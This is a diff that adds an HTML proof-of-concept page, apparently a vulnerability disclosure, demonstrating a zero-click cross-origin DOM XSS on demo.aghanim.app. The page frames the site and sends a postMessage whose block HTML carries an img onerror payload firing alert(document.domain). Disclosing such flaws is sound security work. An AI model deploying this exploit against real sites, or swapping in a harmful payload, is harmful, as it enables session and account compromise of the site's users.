@@ -1,0 +1,27 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Aghanim Hub — zero-click cross-origin DOM XSS PoC</title>
+<h3>PoC: cross-origin DOM XSS on demo.aghanim.app (zero-click)</h3>
+<p>Loading the target in a hidden iframe below. No click needed — the hub exposes
+<code>?preview=on</code> editor mode to anonymous visitors and sends no X-Frame-Options/CSP,
+and its builder <code>postMessage</code> listener only checks <code>e.source===parent</code>
+(no origin check). We send a <code>RichContentBlock</code> whose <code>html</code> is rendered
+via <code>dangerouslySetInnerHTML</code> → <code>alert(document.domain)</code> fires in the
+<code>demo.aghanim.app</code> origin.</p>
+
+<iframe id="f" src="https://demo.aghanim.app/?preview=on" style="width:640px;height:420px;border:1px solid #ccc"></iframe>
+
+<script>
+window.addEventListener('message', function (e) {
+  var f = document.getElementById('f');
+  if (e.source === f.contentWindow && /ready/i.test(String(e.data))) {
+    f.contentWindow.postMessage(JSON.stringify({
+      type: 'preview-state',
+      page: { id:'p', text:'x', layout:{ blocks:[[{
+        id:'b', block:'RichContentBlock',
+        html:'<img src=x onerror=alert(document.domain)>'
+      }]] } }
+    }), '*');
+  }
+});
+</script>
